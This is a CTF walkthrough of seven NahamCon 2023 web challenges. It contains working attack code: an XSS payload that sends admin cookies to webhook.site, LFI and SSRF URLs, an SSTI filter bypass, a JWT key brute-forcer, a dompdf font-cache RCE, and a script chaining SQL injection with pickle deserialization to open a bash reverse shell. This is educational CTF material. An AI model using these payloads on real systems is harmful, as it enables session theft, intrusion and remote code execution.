# NahamCon 2023 CTF - Web Challenges


This post is focused on the walkthrough of NahamCon 2023 CTF.

<!--more-->

# Introduction

I participated in the NahamCon 2023 CTF with the team `m4lware`. We ended up `82` out of `2517` teams. From the web challenges I was only able to solve 2 challenges (Star Wars & Stickers) during the time of the competition but I managed to solve all of them afterwards with some hints and help.

## Star Wars

**Description**

![Star Wars](38.png "Star Wars")

**Solution**

The challenge was very easy. We got a simple website. We can create an account and login as the user. There we see a blog post by `admin` user. 

On the blog post there was a comment section.

![comment](39.png "comment")

The comment feature has no validation or sanitization so trying out for `XSS` we can inject a simple `XSS` payload and it works.

Payload: `<script>alert(2)</script>`

![XSS triggered](40.png "XSS triggered")

We also got a message that comment would be reviewed by admin.

![comment msg](41.png "comment msg")
![comment msg](42.png "comment msg")

This means that we can inject a malicious script and when the admin would review it the XSS would be triggered and we can get his cookie.

Get a link from webhook.site.

Then create an XSS payload as follows.

```javascript
<script>
  const cookie = document.cookie;
  const xhr = new XMLHttpRequest();
  xhr.open("GET", "https://webhook.site/a3c68f0c-<SNIP>/?cookie=" + encodeURIComponent(cookie), true);
  xhr.send();
</script>
```

Inject the payload in the comment and you'll get the admin cookie in a while.

!["Admin cookie in webhooks"](43.png "Admin cookie in webhooks")

Replace your cookie with admin's cookie and you'll be logged in as admin.

Go to `/admin` and you'll get the flag.

![Star wars flag](44.png "Star wars flag")

`Flag: flag{a538c88890d45a382e44dfd00296a99b}`

## Hidden Figures

**Description**

![Hidden Figures](1.png "Hidden Figures")

**Solution** 

Being a static website, it doesn't have anything interesting.

Looking at the Page Source there are multiple images with base64 encoded src. 

![Base64 encoded src](2.png "Base64 encoded src")

Using *extract files* in cyberchef, we get the following image.

![Cyberchef extract file](3.png "Cyberchef extract file")

This indicates the flag may be in one of these images on the website.

Extracting files from these images one by one we get the flag in one of the images.

![Hidden Figures Flag](4.png "Hidden Figures Flag")

`Flag: flag{e62630124508ddb3952843f183843343}`

## Museum

**Description**

![Museum](5.png "Museum")

**Solution**

The website provides a functionality to view different images like in a Museum.

![Landing Page](6.png "Landing Page")

Upon viewing any image it takes us to http://challenge.nahamcon.com:31033/browse?artifact=angwy.jpg

![Image view](7.png "Image view")

The artifact parameter looks promising for a LFI vulnerability.

Upon several tries, I was able to read files from the system with following payload.

http://challenge.nahamcon.com:31033/browse?artifact=/./etc/passwd

![/etc/passwd with LFI](8.png "/etc/passwd with LFI")

We can't directly read the `/flag.txt` as the application blocks us from that.

To read the source code we'll need the path to current application.

We can get this by reading the `/proc/self/cmdline`.

{{< admonition tip "/proc/self/cmdline" >}}
proc/self/cmdline can be used to get an idea of how the program was invoked (and potentially see source code location).
{{< /admonition >}}

Source: https://twitter.com/_JohnHammond/status/1318545091489824769

![/proc/self/cmdline](9.png "/proc/self/cmdline")

Now reading the source code from http://challenge.nahamcon.com:31033/browse?artifact=/./home/museum/app.py

```python

from flask import Flask, request, render_template, send_from_directory, send_file, redirect, url_for
import os
import urllib
import urllib.request

app = Flask(__name__)

@app.route('/')
def index():
    artifacts = os.listdir(os.path.join(os.getcwd(), 'public'))
    return render_template('index.html', artifacts=artifacts)

@app.route("/public/<file_name>")
def public_sendfile(file_name):
    file_path = os.path.join(os.getcwd(), "public", file_name)
    if not os.path.isfile(file_path):
        return "Error retrieving file", 404
    return send_file(file_path)

@app.route('/browse', methods=['GET'])
def browse():
    file_name = request.args.get('artifact')

    if not file_name:
        return "Please specify the artifact to view.", 400

    artifact_error = "<h1>Artifact not found.</h1>"

    if ".." in file_name:
        return artifact_error, 404

    if file_name[0] == '/' and file_name[1].isalpha():
        return artifact_error, 404
    
    file_path = os.path.join(os.getcwd(), "public", file_name)
    if not os.path.isfile(file_path):
        return artifact_error, 404

    if 'flag.txt' in file_path:
        return "Sorry, sensitive artifacts are not made visible to the public!", 404

    with open(file_path, 'rb') as f:
        data = f.read()

    image_types = ['jpg', 'png', 'gif', 'jpeg']
    if any(file_name.lower().endswith("." + image_type) for image_type in image_types):
        is_image = True
    else:
        is_image = False

    return render_template('view.html', data=data, filename=file_name, is_image=is_image)

@app.route('/submit')
def submit():
    return render_template('submit.html')

@app.route('/private_submission_fetch', methods=['GET'])
def private_submission_fetch():
    url = request.args.get('url')

    if not url:
        return "URL is required.", 400

    response = submission_fetch(url)
    return response

def submission_fetch(url, filename=None):
    return urllib.request.urlretrieve(url, filename=filename)

@app.route('/private_submission')
def private_submission():
    if request.remote_addr != '127.0.0.1':
        return redirect(url_for('submit'))

    url = request.args.get('url')
    file_name = request.args.get('filename')

    if not url or not file_name:
        return "Please specify a URL and a file name.", 400

    try:
        submission_fetch(url, os.path.join(os.getcwd(), 'public', file_name))
    except Exception as e:
        return str(e), 500

    return "Submission received.", 200

if __name__ == '__main__':
    app.run(debug=False, host="0.0.0.0", port=5000)

```

The interesting part is the following routes `/private_submission_fetch` and `/private_submission`.

```python
@app.route('/private_submission_fetch', methods=['GET'])
def private_submission_fetch():
    url = request.args.get('url')

    if not url:
        return "URL is required.", 400

    response = submission_fetch(url)
    return response

def submission_fetch(url, filename=None):
    return urllib.request.urlretrieve(url, filename=filename)

@app.route('/private_submission')
def private_submission():
    if request.remote_addr != '127.0.0.1':
        return redirect(url_for('submit'))

    url = request.args.get('url')
    file_name = request.args.get('filename')

    if not url or not file_name:
        return "Please specify a URL and a file name.", 400

    try:
        submission_fetch(url, os.path.join(os.getcwd(), 'public', file_name))
    except Exception as e:
        return str(e), 500

    return "Submission received.", 200

if __name__ == '__main__':
    app.run(debug=False, host="0.0.0.0", port=5000)
```

The `/private_submission_fetch` route takes in a `url` and fetches that page using `urllib.request.urlretrieve`. This basically downloads a file from the provided URL and saves it on the specified path locally.

{{< admonition tip "urllib.request.urlretrieve" >}}
In Python, the urllib.request.urlretrieve function is part of the urllib.request module. It is used to retrieve files from the web by downloading them to the local file system.
{{< /admonition >}}

Since this `submission_fetch` takes in any URL without any validation, it is potentially vulnerable to SSRF.

We can test this using `webhook.site`.

Example URL: http://challenge.nahamcon.com:31033/private_submission_fetch?url=https://webhook.site/de647687-2568-4ea5-bd46-0592eb80626c

The webpage shows 500 Internal Server Error but we get response back on webhook.site.

![webhook.site response](10.png "webhook.site response")

This confirms the SSRF.

The next thing to target is the `/private_submission` route. This only takes requests from `127.0.0.1` so we need to note that. This route basically takes in a URL and a filename and saves the file into the public folder where all the other images are stored.

We can take advantage of this, by leveraging the SSRF from `/private_submission_fetch` and then calling `/private_submission` from `127.0.0.1`. After that, fetch the `flag.txt` and save it in the `public` folder.

Final URL: http://challenge.nahamcon.com:31033/private_submission_fetch?url=http%3a//127.0.0.1%3a5000/private_submission%3furl%3dfile:///flag.txt%26filename%3dsaad.txt

We call the `127.0.0.1:5000/private_submission` from the SSRF in `/private_submission_fetch` then fetch the `flag.txt` using `file:///` and save it locally as `saad.txt` in `public` folder.

Retrieve the flag from: http://challenge.nahamcon.com:31033/public/saad.txt

![Museum Flag](11.png "Museum Flag")

`Flag: flag{c3d727275bee25a40fae2d2d2fba9d70}`


## Obligatory

**Description**

![Obligatory](12.png "Obligatory")

**Solution**

![Landing Page](13.png "Landing Page")

This application provides a basic sign in and sign up feature. We can make an account to login.

Upon logging in, we can see a basic todo app. Creating a new task, it creates a new task and displays the text `Task Created`.

![Todo App](14.png "Todo App")

Notice that upon changing the `success` parameter, whatever we put into it, it reflects back on the page.

![test](15.png "test")

There can be a number of vulnerabilities we can test, one of them is SSTI.

Adding a simple SSTI payload for Jinja2: {{7*7}}

![SSTI works](16.png "SSTI works")

As simple as that we can try a payload from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2) to get the command execution.

Payload: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`

But to our surprise, it blocks certain commands using a blacklist.

![WAF](17.png "WAF")

Trying some WAF bypass payloads, we get one working as follows.

![WAF Bypass Payload](18.png "WAF Bypass Payload")

We can use the `self.__dict__` to get the dictionary that holds the attributes and their corresponding values for an instance of the current class.

To bypass the WAF, we'll use the following payload.

Payload: `{{self|attr('\x5f\x5fdict\x5f\x5f')}}`

![self.__dict__](19.png "self.__dict__")

Here we get the secret key being used in the flask login session.

`Secret Key: &GTHN&Ngup3WqNm6q$5nPGSAoa7SaDuY`

We can use flask-unsign to decode the current `auth-token` cookie.

![Auth-Token](20.png "Auth-Token")

It shows that our `id` is `2`, indicating that there's another user with `id=1`.

We can sign a new cookie with `id=1` as we have the secret key.

![Signing a new cookie](21.png "Signing a new cookie")

Updating the session cookie, we get the flag.

![Obligatory Flag](22.png "Obligatory Flag")

`Flag: flag{7b5b91c60796488148ddf3b227735979}`


## Marmalade 5

**Description**

![Marmalade 5](23.png "Marmalade 5")

**Solution**

![Landing Page](24.png "Landing Page")

The landing page asks us for a username and then takes us to the following page.

![Logged in as saad](25.png "Logged in as saad")

There's nothing much in the application except that we need to somehow become `admin` to get the flag.

We can try entering `admin` as our username on the initial page but it doesn't allow us.

Decoding our session token, we see that it uses MD5_HMAC algorithm and has our username in the payload.

![JWT Token Decoded](26.png "JWT Token Decoded")

Upon changing anything in the original token, we get the following error.

![Invalid Token](27.png "Invalid Token")

This leaks the signing key partially.

Also, notice that if we provide the MD5_HMAC as the token header it shows invalid signature.

![Invalid Signature](28.png "Invalid Signature") 

But if we change the algorithm to `HS256` for instance, then it shows invalid algorithm.

![Invalid Algorithm](29.png "Invalid Algorithm")

So in short, we need to keep the algorithm to MD5_HMAC and brute force the remaining characters of the signing key.

The signing key is 15 characters long out of which 10 are given (all lowercase). So we can guess the remaining 5 characters may also be lowercase letters.

[This](https://stackoverflow.com/questions/68274543/python-manually-create-jwt-token-without-library) post provides details for manual implementation of JWT with `SHA-256`.

We can change the `SHA-256` part to `MD5` to make our custom JWT algorithm.

```python
import json
import base64
import hmac
import hashlib

def create_jwt_token(secret_key):
    jwt_header = """
  {
    "alg": "MD5_HMAC"
  }
  """

    jwt_data = """
  {
    "username": "saad"
  }
  """

    jwt_values = {
    "header": jwt_header,
    "data": jwt_data,
  }

# remove all the empty spaces
    jwt_values_cleaned = {
      key: json.dumps(
        json.loads(value),
        separators = (",", ":"),
      ) for key, value in jwt_values.items()
    }

    jwt_values_enc = {
      key: base64.urlsafe_b64encode(
          value.encode("utf-8")
        ).decode("utf-8").rstrip('=') for key, value in jwt_values_cleaned.items()
    }

    sig_payload = "{header}.{data}".format(
      header = jwt_values_enc['header'],
      data = jwt_values_enc['data'],
    )

    sig = hmac.new(
      secret_key,
      msg = sig_payload.encode("utf-8"),
      digestmod = hashlib.md5
    ).digest()

    ecoded_sig = base64.urlsafe_b64encode(sig).decode("utf-8").rstrip("=")

    jwt_token = "{sig_payload}.{sig}".format(
      sig_payload = sig_payload,
      sig = ecoded_sig
    )

    return jwt_token


print(create_jwt_token(b"test_secret_key"))
```

![custom jwt token](30.png "custom jwt token")

Now we need to brute-force the remaining part of original key to get the full signing key.

```python
def brute_force_secret_key(known_secret_key):
    
    # Assuming only lowercase letters as the first 10 characters are lowercase
    lowercase_letters = 'abcdefghijklmnopqrstuvwxyz'

    total_combinations = len(lowercase_letters) ** 5
    progress_bar = tqdm(total=total_combinations, unit='combination')

    for combination in itertools.product(lowercase_letters, repeat=5):
        # Create the potential secret key by combining the known key and the brute-forced lowercase letters
        secret_key = known_secret_key + ''.join(combination)

        check_token = create_jwt_token("saad", secret_key.encode())

        original_jwt_token = "eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6InNhYWQifQ.N87s9fHVZzgaytkjwri3MQ"

        if (check_token == original_jwt_token):
              print(f'Found original key: {secret_key}')
              return secret_key
              
        progress_bar.update(1)

    else:
        progress_bar.close()
        print("Secret Key not found!")
        return None


partial_secret_key = "fsrwjcfszeg"

original_secret_key = brute_force_secret_key(partial_secret_key)
```

I logged in as `saad` and saved my token as `original_jwt_token`. Next I brute forced the remaining 5 characters of the key and created a new token with `create_jwt_token`. Finally, I matched it against the `original_jwt_token` and if the match is found, then I'll get my original `secret_key`.

Finally using this secret key, we can create the `admin` jwt token to get the flag.

Final script.

```python
import json
import base64
import hmac
import hashlib
import itertools
from tqdm import tqdm

def create_jwt_token(username, secret_key):
    jwt_header = """
  {
    "alg": "MD5_HMAC"
  }
  """

    jwt_data = '{ "username": "{}" }'.format(username)

    jwt_values = {
    "header": jwt_header,
    "data": jwt_data,
  }

# remove all the empty spaces
    jwt_values_cleaned = {
      key: json.dumps(
        json.loads(value),
        separators = (",", ":"),
      ) for key, value in jwt_values.items()
    }

    jwt_values_enc = {
      key: base64.urlsafe_b64encode(
          value.encode("utf-8")
        ).decode("utf-8").rstrip('=') for key, value in jwt_values_cleaned.items()
    }

    sig_payload = "{header}.{data}".format(
      header = jwt_values_enc['header'],
      data = jwt_values_enc['data'],
    )

    sig = hmac.new(
      secret_key,
      msg = sig_payload.encode("utf-8"),
      digestmod = hashlib.md5
    ).digest()

    ecoded_sig = base64.urlsafe_b64encode(sig).decode("utf-8").rstrip("=")

    jwt_token = "{sig_payload}.{sig}".format(
      sig_payload = sig_payload,
      sig = ecoded_sig
    )

    return jwt_token
    
def brute_force_secret_key(known_secret_key):
    
    # Assuming only lowercase letters as the first 10 characters are lowercase
    lowercase_letters = 'abcdefghijklmnopqrstuvwxyz'

    total_combinations = len(lowercase_letters) ** 5
    progress_bar = tqdm(total=total_combinations, unit='combination')

    for combination in itertools.product(lowercase_letters, repeat=5):
        # Create the potential secret key by combining the known key and the brute-forced lowercase letters
        secret_key = known_secret_key + ''.join(combination)

        check_token = create_jwt_token("saad", secret_key.encode())

        original_jwt_token = "eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6InNhYWQifQ.N87s9fHVZzgaytkjwri3MQ"

        if (check_token == original_jwt_token):
              print(f'Found original key: {secret_key}')
              return secret_key
              
        progress_bar.update(1)

    else:
        progress_bar.close()
        print("Secret Key not found!")
        return None


partial_secret_key = "fsrwjcfszeg"

original_secret_key = brute_force_secret_key(partial_secret_key)

print("JWT Token of admin: ", end="")
print(create_jwt_token("admin", original_secret_key.encode()))
```

![Brute-forced key and admin token](31.png "Brute-forced key and admin token")

Change the token, you'll be logged in as `admin` and get the flag.

![Marmalade 5 Flag](32.png "Marmalade 5 Flag")

`Flag: flag{a249dff54655158c25ddd3584e295c3b}`

## Stickers

**Description**

![Stickers](45.png "Stickers")

**Solution**

We get a stickers application in which we can enter `organisation name`, `email` and `number of stickers` to generate a pdf mentioning the total price of the stickers.

![Landing page](46.png "Landing Page")

Upon submitting we get a nice looking PDF with our input values reflected.

![Stickers pdf](47.png "Sticker pdf")

Analyzing the pdf with `pdfinfo` we see it's using `dompdf 1.2`.

![pdfinfo](48.png "pdfinfo")

Upon looking for exploits for dompdf, there was a RCE vulnerability applicable on the same version.

[This](https://positive.security/blog/dompdf-rce) post explains the vulnerability really well so I'll only discuss about it briefly.

{{< admonition tip "dompdf RCE" >}}
Dompdf versions <1.2. 1 are vulnerable to Remote Code Execution (RCE) by injecting CSS into the data. The file can be tricked into storing a malicious font with a . php file extension in its font cache, which can later be executed by accessing it from the web.
{{< /admonition >}}

Source: https://github.com/rvizx/CVE-2022-28368

To make the exploit work, we first need to take a valid `.ttf` file and change the extension to `.php`. This approach is the actual way to exploit it but for some reason if I was using any `.ttf` file and append the `php` in it then it was showing parsing errors.

So I tried looking for POCs and [this](https://github.com/positive-security/dompdf-rce) one's php file worked without any errors.

Git clone the above repo and `cd` into the `exploit` folder.

![git repo](49.png "git repo")

Start a `ngrok` server and put its IP into the `exploit.css` file.

```css
@font-face {
    font-family:'exploitfont';
    src:url('<YOUR_ngrok_IP>/exploit_font.php');
    font-weight:'normal';
    font-style:'normal';
  }
```

Contents of `exploit_font.php` are as follows.

![exploit_font.php](50.png "exploit_font.php")

I'll append another line to print the flag from `/` directory.

![appending flag read](51.png "appending flag read")

![updated exploit_font.php](52.png "updated exploit_font.php")

Now while generating the PDF in the web application, put the value of organisation parameter as follows.

```html
<link rel=stylesheet href="<YOUR_ngrok_IP>/exploit.css">
```

Next, submit the request.

![Generated pdf](53.png "Generated pdf")

Now extract the `md5` sum of the `exploit_font.php` file as follows.

![md5 of exploit_font.php](54.png "md5 of exploit_font.php")

Finally visit the following URL to get the flag.

`http://challenge.nahamcon.com:30473/dompdf/lib/fonts/exploitfont_normal_b54a59dd45adebff7cce9df9a7f53c75.php`

![Stickers flag](55.png "Stickers flag")

`Flag: flag{a4d52beabcfdeb6ba79fc08709bb5508}`





## Transfer

**Description**

![Transfer](33.png "Transfer")

This was one of the coolest web challenges that I've solved. It was hard for me so I had to look at hints and writeups to better understand the code. 

**Solution**

![Landing Page](34.png "Landing Page")

This challenge also provides the source code so we'll analyze that first.

The app.py has several routes so we'll go through the important ones.

Take a look at the `GET /download/<filename>/<sessionid>` route.
```python
@app.route('/download/<filename>/<sessionid>', methods=['GET'])
def download_file(filename, sessionid):
    conn = get_db()
    c = conn.cursor()
    c.execute(f"SELECT * FROM activesessions WHERE sessionid=?", (sessionid,))
    
    active_session = c.fetchone()
    if active_session is None:
        flash('No active session found')
        return redirect(url_for('home'))
    c.execute(f"SELECT data FROM files WHERE filename=?",(filename,))
    
    file_data = c.fetchone()
    if file_data is None:
        flash('File not found')
        return redirect(url_for('files'))

    file_blob = pickle.loads(base64.b64decode(file_data[0]))
    return send_file(io.BytesIO(file_blob), download_name=filename, as_attachment=True)
```

In this route, it first checks if there's an active session exists. 


**active sessions query**
```c.execute(f"SELECT * FROM activesessions WHERE sessionid=?", (sessionid,))```

If this query returns a valid result, it then checks for a specific file. 

**file loading query**
<br>
```c.execute(f"SELECT data FROM files WHERE filename=?",(filename,))```

If the file data exists as well then we get to the `file_blob` part.

Here it calls `pickle.loads()` on the `file_data` fetched earlier.

{{< admonition tip "pickle.loads()" >}}
The risks associated with pickle.loads() are due to the fact that it can execute arbitrary Python code during the deserialization process. If an attacker can control the pickle data, they can potentially craft a payload that executes malicious code when the data is deserialized using pickle.loads().
{{< /admonition >}}

We saw that it calls `pickle.loads()` on the contents of the file fetched from the db. If we can somehow inject RCE Payload on the file and call this API, then it will execute our payload and we can get the shell on the system.

How can we inject the payload into the file?

Let's look at the `/login` endpoint.

`POST /login`
```python
@app.route('/login', methods=['POST'])
def login_user():
    username = DBClean(request.form['username'])
    password = DBClean(request.form['password'])
        
    conn = get_db()
    c = conn.cursor()
    sql = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    c.executescript(sql)
    user = c.fetchone()
    if user:
        c.execute(f"SELECT sessionid FROM activesessions WHERE username=?", (username,))
        active_session = c.fetchone()
        if active_session:
            session_id = active_session[0]
        else:
            c.execute(f"SELECT username FROM users WHERE username=?", (username,))
            user_name = c.fetchone()
            if user_name:
                session_id = str(uuid.uuid4())
                c.executescript(f"INSERT INTO activesessions (sessionid, timestamp) VALUES ('{session_id}', '{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}')")
            else:
                flash("A session could be not be created")
                return logout()
        
        session['username'] = username
        session['session_id'] = session_id
        conn.commit()
        return redirect(url_for('files'))
    else:
        flash('Username or password is incorrect')
        return redirect(url_for('home'))
```

This route takes in a `username` and `password`, then passes it to the SQL query to check if the user exists.

Notice that it first passes the params through `DBClean` function.

`DBClean function`
```python
def DBClean(string):
    for bad_char in " '\"":
        string = string.replace(bad_char,"")
    return string.replace("\\", "'")
```

Here if we provide, `<space>`, `'`, or `""` then it removes it from the parameter. This removes the chance of SQL injection but the last line `string.replace("\\", "'")` basically introduces the SQLi here.

If the `DBClean` sees a `\` then it replaces it with `'` single quotation mark, allowing us to exploit the SQLi.

Next thing to note is the usage of `executescript()` and `execute()` functions.

{{< admonition tip "executescript()" >}}
- executescript() is used to execute multiple SQL statements or an entire script.
- It takes a string argument containing one or more SQL statements.
- It can execute multiple queries separated by semicolons (;) or newline characters (\n).
- Unlike execute(), it does not return a cursor object.
- It automatically commits the changes to the database if no error occurs.
{{< /admonition >}}

{{< admonition tip "execute()" >}}
- execute() is used to execute a single SQL statement.
- It takes the SQL query as a string argument.
- It can be used with parameterized queries by passing a tuple or dictionary as the second argument.
- The method returns a cursor object that can be used to fetch the query results.
{{< /admonition >}}


Our query with the username and password will go through `executescript()` first so we can have a payload containing multiple SQL queries.



To inject the RCE payload into the files, the SQLi comes into play.

First thing is to insert a malicious file into the files table. To do that, we'll need to pass the active sessions query and to pass the active sessions query, we need to insert a valid query in activesessions table.

So we'll go through the following steps.

1. Insert a valid active session into the database.
2. Generate a payload for RCE.
3. Insert the Payload into the file.
4. Trigger the file to get the RCE.

### Inserting a valid active session

As we previously saw that the username parameter is first passed in `DBClean` function and then passed to `executescript()`. We can make a SQLi payload such that it leverages the SQLi, bypasses the `DBClean` sanitization and inserts a new active session to the DB.

I'll run the exploit locally first by running the `app.py` file as `python3 app.py`

This will also create a `/tmp/database.db` file.

The db schema is as follows.

![sqlite3 db schema](35.png "sqlite3 db schema")

The `activesessions` table has three fields i.e. session_id, username and timestamp.

The timestamp format can be seen from the `app.py`.

`c.executescript(f"INSERT INTO activesessions (sessionid, timestamp) VALUES ('{session_id}', '{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}')")`

Now the query to insert the active session into the DB.

SQLi Query: `admin';\nINSERT INTO activesessions (sessionid, username, timestamp) VALUES ('123', 'saad', '2023-06-20/**/06:13:22.123456');--`

I made a function for reversing the `DBClean()` function such that if I provide the normal query it would convert into a version suitable for `DBClean()` function.

```python
def DBRestore(string):

    string = string.replace("'", "\\")
    string = string.replace("\n", "%0a")
    string = string.replace(" ", "/**/")

    return string
```

Credits for this idea goes to: https://www.youtube.com/watch?v=PbpDB0jlqbc&ab_channel=Kr1ppl3r

### Generating a payload for RCE

Make a class `doPickle` whose overall purpose is to create a payload that, when deserialized using pickle.loads(), will execute the specified payload as a command using os.system(). 

```python
def doPickle(payload):
    class PickleRce(object):
        def __reduce__(self):
            return (os.system, (payload,))
    
    return base64.b64encode(pickle.dumps(PickleRce()))
```

Next is to create a reverse shell.

```python
encodedCommand = base64.b64encode(f'bash -i >& /dev/tcp/{LHOST} 0>&1'.encode('utf-8')).decode('utf-8')
Command = f'echo "{encodedCommand}" | base64 -d | bash '
picklePayload = doPickle(Command).decode('utf-8')
```

Reference: https://silver-4.gitbook.io/about/this-week/capture-the-flag/transfer

### Inserting the payload into the files table

From the schema, the files table takes in unique filename, blob data and valid session id.

SQLi Query: `admin';\nINSERT INTO files (filename, data, sessionid) VALUES ('MYFILE', 'PICKLEPAYLOAD', '123');--`

Passing it through the `DBRestore` function I made, we can get the `DBClean` version of this.

### Final Script

```python
import pickle, requests ,sys, random, base64, os

# Specifying URL of the site and 

URL, IP_PORT = sys.argv[1], sys.argv[2].replace(":", "/")

print(f"(+) Target URL: {URL}")
print(f"(+) Your IP and PORT: {IP_PORT}")

# Function to make the pickle RCE payload

def doPickle(payload):
    class PickleRce(object):
        def __reduce__(self):
            return (os.system, (payload,))
    
    return base64.b64encode(pickle.dumps(PickleRce()))

# Function to trigger the RCE payload after inserting into the DB

def triggerPayload(filename):
    print("(+) Trigger payload")
    
    headers = {
        'Host': URL,
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    endpoint = f"{URL}/download/{filename}/123"
    print(f"(+) Endpoint: {endpoint}")

    return requests.get(endpoint, headers=headers, verify=False, allow_redirects=False).text
    
# Inverted Function for the DBClean sanitization

def DBRestore(string):

    string = string.replace("'", "\\")
    string = string.replace("\n", "%0a")
    string = string.replace(" ", "/**/")

    return string
    
# Function to send the HTTP requests to /login endpoint for inserting different queries

def sendRequest(description, data):
    print(f"(+) {description}")

    headers = {
        'Host': URL,
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    data = f'username={data}&password=1'

    return requests.post(f"{URL}/login", headers=headers, data=data, verify=False, allow_redirects=False).text

# Inserting an active session

payload = DBRestore("admin';\nINSERT INTO activesessions (sessionid, username, timestamp) VALUES ('123', 'saad', '2023-06-20/**/06:13:22.123456');--")
sendRequest("Create session", payload)

# Generating a random number for unique file name

randNum = random.randint(10000, 99999)

# Generating the reverse shell and pickle payload

encodedCommand = base64.b64encode(f'bash -i >& /dev/tcp/{IP_PORT} 0>&1'.encode('utf-8')).decode('utf-8')
Command = f'echo "{encodedCommand}" | base64 -d | bash '
picklePayload = doPickle(Command).decode('utf-8')

# Inserting file with payload into the DB

payload = DBRestore("admin';\nINSERT INTO files (filename, data, sessionid) VALUES ('MYFILE', 'PICKLEPAYLOAD', '123');--".replace("MYFILE", str(randNum)).replace("PICKLEPAYLOAD", picklePayload))
sendRequest("Create file", payload)

# Triggering the payload to get RCE

triggerPayload(randNum)
```

Start the ngrok and nc listener and execute the script.

![Executing the script](36.png "Executing the script")

We'll get a reverse shell as user `transfer`.

`sudo -l` reveals `(root) NOPASSWD: ALL`.

Run `sudo su` to get shell as root and read the flag at `/root/flag.txt`.

![Transfer Flag](37.png "Transfer Flag")

`Flag: flag{8acde75d731975c7bccaf64f805f131f}`

**Thanks for reading**





